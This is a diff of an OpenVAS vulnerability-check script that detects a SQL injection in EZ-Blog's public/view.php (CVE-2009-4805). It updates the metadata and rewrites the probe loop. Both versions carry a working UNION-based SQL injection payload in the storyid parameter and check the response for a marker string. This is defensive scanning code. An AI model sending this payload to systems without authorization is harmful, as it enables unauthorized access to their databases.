@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: ezblog_sql_injection.nasl 4655 2016-12-01 15:18:13Z teissa $
+# $Id: ezblog_sql_injection.nasl 5776 2017-03-30 06:05:40Z cfi $
 #
 # EZ-Blog 'public/view.php' SQL Injection Vulnerability
 #
@@ -36,20 +36,19 @@ tag_summary = "EZ-Blog is prone to an SQL-injection vulnerability because it fai
 tag_solution = "Update to newer version if available at http://sourceforge.net/projects/ez-blog/
   or set 'magic_quotes_gpc = On' in php.ini.";
 
-if (description)
+if(description)
 {
  script_id(100012);
- script_version("$Revision: 4655 $");
- script_tag(name:"last_modification", value:"$Date: 2016-12-01 16:18:13 +0100 (Thu, 01 Dec 2016) $");
+ script_version("$Revision: 5776 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:05:40 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-06 13:13:19 +0100 (Fri, 06 Mar 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4805");
  script_bugtraq_id(33947);
-
  script_name("EZ-Blog 'public/view.php' SQL Injection Vulnerability");
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -64,22 +63,18 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dir = make_list("/blog","/ezblog", cgi_dirs()); 
- 
-foreach d (dir)
-{ 
- url = string(d, "/public/view.php?storyid=-1%27%20UNION%20ALL%20SELECT%201,2,132323231,4,5,6,7,8,9,10%23");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
- if( buf == NULL )continue;
- if( buf =~ "Category: 132323231" )
-   {    
-    security_message(port:port);
-    exit(0);
-   }
+foreach dir( make_list_unique( "/blog", "/ezblog", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/public/view.php?storyid=-1%27%20UNION%20ALL%20SELECT%201,2,132323231,4,5,6,7,8,9,10%23");
+
+  if(http_vuln_check(port:port, url:url,pattern:"Category: 132323231")) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
-exit(0);
+
+exit( 99 );
